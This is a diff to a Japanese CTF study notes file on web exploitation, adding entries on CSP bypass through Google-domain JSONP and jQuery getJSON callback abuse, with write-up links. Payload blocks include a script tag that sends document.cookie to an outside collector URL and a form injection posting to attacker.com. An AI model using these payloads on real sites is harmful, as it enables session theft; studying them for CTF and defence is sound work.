@@ -1466,6 +1466,43 @@ jpg、bmp、gif、pngをアップロードしたときは、そのアップロ�
 なので`.webp`ファイルの中にJavascriptを仕込んで、`<script nonce="470532bcd9e5bd79c9138a88cad3e6d4" src="/assets/js/effects/../../../upload/images/4daccad65173686b0d0311fabeff9141.webp".min.js"></script>`で読み込んで実行させる。  
 - **Payload**   
 ブログ内で`.webp`ファイルの作成方法が書かれている。  
+## CSP bypass with JSONP in Google domain (CSAW-Quals-2019 BabyCSP)
+https://github.com/jacopotediosi/Writeups/tree/master/CTF/2019/CSAW-Quals-2019/Web-BabyCSP-50  
+- **entrypoint**   
+投稿を作成できるフォームがあって、そこをAdminがアクセスしてくれるっぽい。  
+以下のCSPルールがある。  
+```txt
+Content-Security-Policy: default-src 'self'; script-src 'self' *.google.com; connect-src *
+```
+これをチェックするといかのようになったが、Writeupでは`*.google.com`にCSPバイパスできるJSONPを返すコンテンツがあるよって警告も出てる…  
+![image](https://user-images.githubusercontent.com/56021519/103884739-557e2380-5122-11eb-8097-b12a641168ad.png)  
+`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`でJSを実行できる！  
+
+- **Payload**   
+```txt
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=window.location.href%3D%27https%3A%2F%2Fen5pzvwnw7lrc.x.pipedream.net%3Fa%3D%27%2Bdocument.cookie%3B"></script>
+```
+## CSP bypass with JSONP in Google domain / XSS Auditor / Inject form (inshack-2019 bypasses-everywhere)
+https://github.com/InsecurityAsso/inshack-2019/blob/master/bypasses-everywhere/writeup.md  
+- **entrypoint**   
+問題設定がよくわからん…  
+- **Payload**   
+```txt
+http://127.0.0.1:8080/article?time=<form method=post enctype=text/plain><input name='{"secret":"No one will never ever access this beauty","url":"http://attacker.com/","a":"' value='"}'></form><script src=https://ww&unit=w.google.com/jsapi?callback=document.forms[0].submit></script>
+```
+
+## JSONP with jQuery.getJSON (SECCON 2019 予選 SPA)
+https://blog.nhiroki.net/2019/10/20/seccon-2019-qual-write-up  
+- **entrypoint**   
+``this.contest = await $.getJSON(`/${contestId}.json`)``の中に`#`以降の文字列を挿入できるらしい。  
+`http://spa.chal.seccon.jp:18364/#/example.com/a`にアクセスすると、``$.getJSON(//example.com/a.json)``となり、`http://example.com/a.json`にアクセスしてくれるらしい。  
+ただし、`getJSON`なのでJSONとして受け取ったデータを解釈するため、`alert(1)`みたいなのを返させてもJavaScriptとして実行してくれない。  
+`jQuery`の`$.getJSON`はURLの中に`?callback=`があると受信したデータをJSONではなくJSONPとして解釈するらしく、これでJSを実行できる！(JSONPはJSONではなくJavaScriptなので)  
+https://api.jquery.com/jQuery.getJSON/  
+- **Payload**   
+```txt
+ http://spa.chal.seccon.jp:18364/#/example.com/a.js?callback=?&
+```
 ## 
 - **entrypoint**   
 - **概要**   
@@ -2197,7 +2234,10 @@ https://jsbin.com/?html
 html,css,JavaScript,Consoleを自由に実行できるようなサイト。XSSの検証によさそう！  
 https://www.hamayanhamayan.com/entry/2020/06/27/191504  
 .innerHTMLのサニタイジングをバイパスするテク  
+https://github.com/koczkatamas/gctf19/tree/master/pastetastic  
+難しそう。  
 
-
-
-
+https://graneed.hatenablog.com/entry/2018/12/16/003745  
+2018のWeb問のまとめ  
+https://graneed.hatenablog.com/entry/2019/12/29/115100#Cross-Site-ScriptingXSS  
+2019のWeb問のまとめ  
